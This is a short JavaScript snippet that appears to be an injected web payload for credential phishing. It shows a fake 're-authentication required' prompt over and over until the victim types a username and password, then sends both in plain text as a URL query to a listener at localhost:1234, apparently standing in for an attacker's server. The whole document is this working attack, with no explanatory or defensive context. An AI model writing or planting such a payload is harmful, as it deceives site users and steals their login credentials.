let pw = "";
let un = "";

do {
	un = prompt("Re-authentication required.\nPlease enter your username:");
	pw = prompt("Please re-enter your password to continue:");
} while(!pw || !un);

val =  un + "," + pw;

var x = new XMLHttpRequest;
x.open("GET", "http://localhost:1234?"+val);
x.send();
